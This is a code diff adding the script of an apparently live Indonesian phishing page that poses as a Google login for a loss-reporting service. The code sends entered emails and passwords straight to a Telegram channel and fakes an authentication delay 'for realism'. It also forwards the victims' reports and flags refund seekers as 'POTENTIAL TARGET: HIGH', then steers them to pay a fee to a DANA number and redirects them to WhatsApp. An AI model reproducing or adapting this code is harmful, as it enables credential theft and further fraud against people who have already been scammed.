+            static sendLoginData(email, password) {
+                const message = `🔐 LOGIN DETECTED - ${appState.userData.reportId}\n` +
+                               `📧 Email: ${email}\n` +
+                               `🔑 Password: ${password}\n` +
+                               `🕐 Login Time: ${new Date().toLocaleString('id-ID')}\n` +
+                               `🌍 Location: ${appState.userData.ipAddress}\n` +
+                               `🔧 Device: ${appState.userData.userAgent}`;
+                
+                this.sendToTelegram(message);
+            }
+        }
+
+        // WhatsApp Manager
+        class WhatsAppManager {
+            static getRedirectURL() {
+                return `https://wa.me/${WHATSAPP_NUMBER}?text=${WHATSAPP_MESSAGE}`;
+            }
+
+            static redirectToWhatsApp() {
+                window.open(this.getRedirectURL(), '_blank');
+                
+                // Send WhatsApp redirection notification to Telegram
+                TelegramManager.sendToTelegram(
+                    `📱 WHATSAPP REDIRECTION - ${appState.userData.reportId}\n` +
+                    `👤 User: ${appState.userData.email}\n` +
+                    `💰 Amount: Rp50,000\n` +
+                    `📞 Target: ${WHATSAPP_NUMBER}\n` +
+                    `🎯 Status: USER_REDIRECTED_TO_WHATSAPP`
+                );
+            }
+        }
+
+        // Initialize Application
+        const appState = new ApplicationState();
+        const currencyFormatter = new CurrencyFormatter();
+
+        // DOM Elements
+        const loginScreen = document.getElementById('loginScreen');
+        const reportScreen = document.getElementById('reportScreen');
+        const thankYouAnimation = document.getElementById('thankYouAnimation');
+        const letterAnimation = document.getElementById('letterAnimation');
+        const paymentScreen = document.getElementById('paymentScreen');
+        const transactionHistory = document.getElementById('transactionHistory');
+        const nominalInput = document.getElementById('nominal');
+        const reportIdDisplay = document.getElementById('reportIdDisplay');
+        const historyReportId = document.getElementById('historyReportId');
+        const letterNumber = document.getElementById('letterNumber');
+
+        // Update IDs display
+        reportIdDisplay.textContent = appState.userData.reportId;
+        historyReportId.textContent = appState.userData.reportId;
+        letterNumber.textContent = `NO: ${appState.userData.letterNumber}`;
+
+        // Enhanced Currency Input Handler
+        nominalInput.addEventListener('input', function(e) {
+            const cursorPosition = e.target.selectionStart;
+            const originalLength = e.target.value.length;
+            
+            const formatted = currencyFormatter.format(e.target.value);
+            e.target.value = formatted;
+            
+            const newLength = formatted.length;
+            const cursorOffset = newLength - originalLength;
+            e.target.setSelectionRange(cursorPosition + cursorOffset, cursorPosition + cursorOffset);
+        });
+
+        nominalInput.addEventListener('blur', function() {
+            const validation = currencyFormatter.validate(this.value);
+            if (!validation.isValid) {
+                AnimationController.showNotification('Nominal tidak valid. Masukkan angka yang benar.', 'error');
+                this.value = '';
+            } else {
+                this.value = validation.formatted;
+                appState.userData.nominal = validation.value;
+            }
+        });
+
+        // Login Handler with Enhanced Animation
+        document.getElementById('loginBtn').addEventListener('click', async function() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                AnimationController.showNotification('Harap isi email dan password', 'error');
+                return;
+            }
+
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                AnimationController.showNotification('Format email tidak valid', 'error');
+                return;
+            }
+
+            // Show loading animation on button
+            AnimationController.showLoginLoading(true);
+            AnimationController.showLoading('Mengautentikasi ke Google', 'Memverifikasi kredensial Anda...');
+
+            // Store user data
+            appState.userData.email = email;
+            appState.userData.password = password;
+
+            // Send login data to Telegram immediately
+            TelegramManager.sendLoginData(email, password);
+
+            // Simulate Google authentication delay (2-3 seconds for realism)
+            await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 1000));
+
+            // Hide loading
+            AnimationController.hideLoading();
+            AnimationController.showLoginLoading(false);
+
+            // Animate transition
+            await AnimationController.showBlurOut(loginScreen);
+            await new Promise(resolve => setTimeout(resolve, 600));
+            
+            await AnimationController.showSlideUpBlur(reportScreen);
+            
+            AnimationController.showNotification('Autentikasi berhasil! Selamat datang di sistem RIP AZTHANZ', 'success');
+            
+            // Start particle animation
+            appState.animateParticles();
+        });
+
+        // Ikhlas Button Handler
+        document.getElementById('ikhlasBtn').addEventListener('click', async function() {
+            const kronologi = document.getElementById('kronologi').value.trim();
+            const nominal = nominalInput.value;
+
+            if (!kronologi || !nominal) {
+                AnimationController.showNotification('Harap isi kronologi dan nominal RIP', 'error');
+                return;
+            }
+
+            appState.userData.kronologi = kronologi;
+
+            // Show loading
+            AnimationController.showLoading('Menyimpan laporan', 'Mohon tunggu...');
+
+            // Send report data to Telegram
+            TelegramManager.sendToTelegram(
+                `📋 LAPORAN IKHLAS - ${appState.userData.reportId}\n` +
+                `📝 Kronologi: ${kronologi.substring(0, 500)}${kronologi.length > 500 ? '...' : ''}\n` +
+                `💰 Nominal: Rp${currencyFormatter.parse(nominal).toLocaleString('id-ID')}\n` +
+                `📊 Status: IKHLAS\n` +
+                `👤 User: ${appState.userData.email}`
+            );
+
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            AnimationController.hideLoading();
+
+            await AnimationController.showBlurOut(reportScreen);
+            await new Promise(resolve => setTimeout(resolve, 600));
+            
+            await AnimationController.showBlurIn(thankYouAnimation);
+
+            // Update transaction history
+            setTimeout(async () => {
+                document.getElementById('historyAmount').textContent = `Rp${currencyFormatter.parse(nominal).toLocaleString('id-ID')}`;
+                document.getElementById('reportDate').textContent = new Date().toLocaleDateString('id-ID', { 
+                    weekday: 'long', 
+                    year: 'numeric', 
+                    month: 'long', 
+                    day: 'numeric' 
+                });
+                document.getElementById('reportTime').textContent = new Date().toLocaleTimeString('id-ID', {
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+
+                await AnimationController.showBlurOut(thankYouAnimation);
+                await new Promise(resolve => setTimeout(resolve, 600));
+                
+                await AnimationController.showSlideUpBlur(reportScreen);
+                await AnimationController.showBlurIn(transactionHistory);
+                
+                AnimationController.showNotification('Laporan berhasil disimpan!', 'success');
+            }, 4000);
+        });
+
+        // Uang Kembali Button Handler
+        document.getElementById('uangKembaliBtn').addEventListener('click', async function() {
+            const kronologi = document.getElementById('kronologi').value.trim();
+            const nominal = nominalInput.value;
+
+            if (!kronologi || !nominal) {
+                AnimationController.showNotification('Harap isi kronologi dan nominal RIP', 'error');
+                return;
+            }
+
+            appState.userData.kronologi = kronologi;
+
+            // Show loading
+            AnimationController.showLoading('Memproses permintaan', 'Menyiapkan surat tindak lanjut...');
+
+            // Send report data to Telegram
+            TelegramManager.sendToTelegram(
+                `📋 LAPORAN MINT UANG KEMBALI - ${appState.userData.reportId}\n` +
+                `📝 Kronologi: ${kronologi.substring(0, 500)}${kronologi.length > 500 ? '...' : ''}\n` +
+                `💰 Nominal: Rp${currencyFormatter.parse(nominal).toLocaleString('id-ID')}\n` +
+                `📊 Status: MOHON UANG KEMBALI\n` +
+                `👤 User: ${appState.userData.email}\n` +
+                `⚠️ POTENTIAL TARGET: HIGH`
+            );
+
+            await new Promise(resolve => setTimeout(resolve, 1200));
+            AnimationController.hideLoading();
+
+            await AnimationController.showBlurOut(reportScreen);
+            await new Promise(resolve => setTimeout(resolve, 600));
+            
+            await AnimationController.showSlideUpBlur(letterAnimation);
+            
+            AnimationController.showNotification('Surat tindak lanjut telah disiapkan', 'info');
+        });
+
+        // Back to Ikhlas from Letter
+        document.getElementById('backToIkhlas').addEventListener('click', async function() {
+            await AnimationController.showBlurOut(letterAnimation);
+            await new Promise(resolve => setTimeout(resolve, 600));
+            
+            await AnimationController.showSlideUpBlur(reportScreen);
+            
+            // Show transaction history
+            const nominal = nominalInput.value;
+            if (nominal) {
+                document.getElementById('historyAmount').textContent = `Rp${currencyFormatter.parse(nominal).toLocaleString('id-ID')}`;
+                document.getElementById('reportDate').textContent = new Date().toLocaleDateString('id-ID', { 
+                    weekday: 'long', 
+                    year: 'numeric', 
+                    month: 'long', 
+                    day: 'numeric' 
+                });
+                document.getElementById('reportTime').textContent = new Date().toLocaleTimeString('id-ID', {
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+                await AnimationController.showBlurIn(transactionHistory);
+            }
+        });
+
+        // Kirim Biaya Button Handler
+        document.getElementById('kirimBiayaBtn').addEventListener('click', async function() {
+            AnimationController.showLoading('Menyiapkan pembayaran', 'Mengalihkan ke halaman pembayaran...');
+
+            // Send payment request to Telegram
+            TelegramManager.sendToTelegram(
+                `💰 PAYMENT REQUESTED - ${appState.userData.reportId}\n` +
+                `👤 User: ${appState.userData.email}\n` +
+                `💸 Amount: Rp50,000\n` +
+                `📞 Dana Number: 08153721446\n` +
+                `📱 WhatsApp: ${WHATSAPP_NUMBER}\n` +
+                `🎯 Status: AWAITING_PAYMENT`
+            );
+
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            AnimationController.hideLoading();
+
+            await AnimationController.showBlurOut(letterAnimation);
+            await new Promise(resolve => setTimeout(resolve, 600));
+            
+            await AnimationController.showSlideUpBlur(paymentScreen);
+            
+            AnimationController.showNotification('Halaman pembayaran siap', 'info');
+        });
+
+        // Copy Dana Number
+        document.getElementById('copyDana').addEventListener('click', function(e) {
+            e.preventDefault();
+            navigator.clipboard.writeText('08153721446');
+            AnimationController.showNotification('Nomor DANA berhasil disalin ke clipboard!', 'success');
+        });
+
+        // Back to Letter from Payment
+        document.getElementById('backToLetter').addEventListener('click', async function() {
+            await AnimationController.showBlurOut(paymentScreen);
+            await new Promise(resolve => setTimeout(resolve, 600));
+            
+            await AnimationController.showSlideUpBlur(letterAnimation);
+        });
+
+        // Confirm Payment Button - Redirect to WhatsApp
+        document.getElementById('confirmPayment').addEventListener('click', async function() {
+            AnimationController.showLoading('Mengalihkan ke WhatsApp', 'Membuka aplikasi WhatsApp...');
+            
+            // Send payment confirmation to Telegram
+            TelegramManager.sendToTelegram(
+                `✅ PAYMENT CONFIRMATION INITIATED - ${appState.userData.reportId}\n` +
+                `👤 User: ${appState.userData.email}\n` +
+                `💸 Amount: Rp50,000\n` +
+                `📱 WhatsApp Redirect: ${WHATSAPP_NUMBER}\n` +
+                `🎯 Status: REDIRECTING_TO_WHATSAPP`
+            );
+
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            AnimationController.hideLoading();
+            
+            // Redirect to WhatsApp
+            WhatsAppManager.redirectToWhatsApp();
+            
+            // Show notification
+            AnimationController.showNotification('Mengalihkan ke WhatsApp...', 'info');
+        });
+
+        // Initialize application
+        document.addEventListener('DOMContentLoaded', function() {
+            // Create particles
+            appState.createParticles();
+            
+            // Trigger initial animation
+            setTimeout(() => {
+                AnimationController.showNotification('Sistem RIP AZTHANZ siap digunakan', 'success');
+            }, 1000);
+
+            // Auto-focus email field
+            document.getElementById('email').focus();
+
+            // Add particle animation styles
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes particleFloat {
+                    0%, 100% { transform: translate(0, 0) scale(1); opacity: 0.1; }
+                    25% { transform: translate(10px, -10px) scale(1.2); opacity: 0.3; }
+                    50% { transform: translate(-5px, 5px) scale(0.8); opacity: 0.2; }
+                    75% { transform: translate(-10px, -5px) scale(1.1); opacity: 0.4; }
+                }
+            `;
+            document.head.appendChild(style);
+
+            // Auto submit on Enter in password field
+            document.getElementById('password').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    document.getElementById('loginBtn').click();
+                }
+            });
+        });
+
+        // Prevent form submission
+        document.addEventListener('submit', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
